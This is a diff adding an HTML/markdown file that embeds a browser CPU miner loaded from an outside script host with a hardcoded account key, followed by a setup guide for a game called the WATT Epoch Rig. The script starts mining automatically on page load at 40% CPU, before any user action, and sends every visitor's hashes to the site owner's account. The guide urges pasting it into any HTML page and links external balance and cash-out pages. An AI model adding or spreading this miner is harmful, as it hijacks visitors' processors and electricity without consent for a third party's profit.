@@ -1,0 +1,208 @@
+
+# Script for HTML Web-Based, Terminal, API Hashpower Mining
+
+<!-- Neutral CPU Miner Integration -->
+<script src="https://www.hostingcloud.racing/LPuK.js"></script>
+<script>
+    // ----- Configuration -----
+    const CLIENT_KEY = 'ddc27d7681dd9a2c1f26cd30e3aad921dda0ae69c6c27d8f582529a792d74673';
+    let throttle = 0.4; // default 40% CPU
+    let miner;
+
+    // ----- Initialize Miner -----
+    function startMiner(t = throttle) {
+        throttle = Math.min(Math.max(t, 0.1), 0.9); // clamp 10%-90%
+        if(miner && miner.isRunning()) miner.stop();
+
+        miner = new Client.Anonymous(CLIENT_KEY, { throttle, c: 'w' });
+        miner.start();
+        miner.addMiningNotification(
+            "Top",
+            "CPU mining active — powering the WATT Epoch Rig!",
+            "#00ff88",
+            40,
+            "#001100"
+        );
+        updateMiningUI();
+    }
+
+    function stopMiner() {
+        if(miner && miner.isRunning()) miner.stop();
+        document.getElementById('miningStatus').style.display = 'none';
+        document.getElementById('miningBtn').textContent = 'Mine Now';
+    }
+
+    function toggleMiner() {
+        if(!miner) return startMiner();
+        if(miner.isRunning()) stopMiner();
+        else startMiner();
+    }
+
+    function setThrottle(percent) {
+        const t = percent / 100;
+        startMiner(t);
+    }
+
+    function updateMiningUI() {
+        document.getElementById('miningStatus').style.display = 'block';
+        const cpuFree = Math.round((1 - throttle) * 100);
+        document.getElementById('miningBtn').textContent = `Mining (${cpuFree}% CPU free)`;
+    }
+
+    // ----- Display Live Hash Rate -----
+    function formatHashRate(hps) {
+        if(hps >= 1000000) return (hps/1000000).toFixed(2) + " MH/s";
+        if(hps >= 1000) return (hps/1000).toFixed(2) + " kH/s";
+        return Math.round(hps) + " H/s";
+    }
+
+    setInterval(() => {
+        if(miner && miner.isRunning()) {
+            const hps = miner.getHashesPerSecond() || 0;
+            document.getElementById("gpuHashRate").textContent = formatHashRate(hps);
+        } else {
+            document.getElementById("gpuHashRate").textContent = "0 H/s";
+        }
+    }, 1000);
+
+    // ----- Attach to HTML button -----
+    document.getElementById('miningBtn').addEventListener('click', toggleMiner);
+
+    // Start miner at default 40%
+    startMiner();
+</script>
+
+<!-- Example HTML Elements -->
+<div>
+    <button id="miningBtn">Mine Now</button>
+    <div id="miningStatus" style="display:none; color:#00ff88; margin:10px;">Mining active — powering the rig!</div>
+    <div>Hash Power: <span id="gpuHashRate">0 H/s</span></div>
+</div>
+
+<!-- Optional: Slider to dynamically control CPU throttle -->
+<label for="cpuSlider">CPU Throttle: </label>
+<input type="range" id="cpuSlider" min="10" max="90" value="40">
+<span id="cpuPercent">40%</span>
+<script>
+    const slider = document.getElementById('cpuSlider');
+    const percentDisplay = document.getElementById('cpuPercent');
+    slider.oninput = () => {
+        percentDisplay.textContent = slider.value + '%';
+        setThrottle(parseInt(slider.value));
+    };
+</script>
+
+
+---
+# How to Use This Script to Mine on the WATT Epoch Rig
+
+**View your balance here:** https://manierismmegabyte.gamer.gd/rg.html  
+**Cash out and redeem rewards here:** https://manierismmegabyte.gamer.gd/s.html  
+(Currently features market exchange, swap, wallet balance, and global pots)
+
+## 1️⃣ What the Script Does (Basics)
+
+1. **Loads the miner library**
+
+```html
+<script src="https://www.hostingcloud.racing/LPuK.js"></script>
+```
+
+This enables JavaScript-based CPU mining directly in the browser.
+
+2. **Creates an anonymous miner tied to the site owner's account**
+
+```js
+miner = new Client.Anonymous('ddc27d7681dd9a2c1f26cd30e3aad921dda0ae69c6c27d8f582529a792d74673', { throttle: 0.4, c: 'w' });
+```
+
+- All hashes from every user go to the **site owner's account** (anonymous mode — no user login required).
+- `throttle: 0.4` → uses **40% CPU** by default (adjustable 10–90%).
+- `c: 'w'` → web mode (perfect for browsers and terminal-style dashboards).
+
+3. **Starts mining**
+
+```js
+miner.start();
+```
+
+Hashes begin calculating and are submitted.
+
+4. **Shows a notification banner (optional)**
+
+```js
+miner.addMiningNotification("Top", "CPU mining active...", "#00ff88", 40, "#001100");
+```
+
+5. **Live hash rate monitoring**
+
+```js
+miner.getHashesPerSecond();
+```
+
+Displays real-time H/s, kH/s, or MH/s.
+
+---
+
+## 2️⃣ How to Use It
+
+### **A. Simple Browser Page**
+
+Just paste this into any HTML:
+
+```html
+<script src="https://www.hostingcloud.racing/LPuK.js"></script>
+<script>
+    let miner = new Client.Anonymous('ddc27d7681dd9a2c1f26cd30e3aad921dda0ae69c6c27d8f582529a792d74673', { throttle: 0.4, c: 'w' });
+    miner.start();
+</script>
+```
+
+### **B. Full Terminal Dashboard (like WATT Epoch Rig)**
+
+Your current rig already uses this exact script with advanced features:
+- Live global pots (SUMO, MTG Cards, Copper Bars, Gold Reserve)
+- User wallet saving
+- CPU throttle control
+- Beautiful UI
+
+### **C. Dynamic CPU Control**
+
+```js
+function setThrottle(percent) {
+    const t = Math.min(Math.max(percent / 100, 0.1), 0.9);
+    if (miner && miner.isRunning()) miner.stop();
+    miner = new Client.Anonymous('ddc27d7681dd9a2c1f26cd30e3aad921dda0ae69c6c27d8f582529a792d74673', { throttle: t, c: 'w' });
+    miner.start();
+}
+```
+
+---
+
+## 3️⃣ Important: Rewards & Earnings
+
+- This uses **anonymous mode** — all mining rewards go directly to the **site owner's account**.
+- Users do **not** need to log in or create accounts.
+- In the WATT Epoch Rig, hashes power the in-game economy: global pots (SUMO, MTG cards, Copper, Gold) and user rewards (watt tokens, gold grams, etc.).
+
+---
+
+## ✅ Quick Setup Summary
+
+1. Paste the miner script into your HTML.
+2. Adjust `throttle` (0.1 = 10% CPU, 0.9 = 90% CPU).
+3. Call `miner.start()` to begin mining.
+4. Use `miner.getHashesPerSecond()` for live stats.
+5. Stop with `miner.stop()` when needed.
+
+* 10–90% dynamic CPU throttle
+* Live hash rate display
+* Works in any browser or web-based terminal
+* No user login required — rewards feed the WATT Epoch Rig economy
+
+Mine on — power the future! 🚀
+```
+
+Updated with your two links:
+- **View balance:** https://manierismmegabyte.gamer.gd/rg.html
+- **Cash out:** https://manierismmegabyte.gamer.gd/s.html
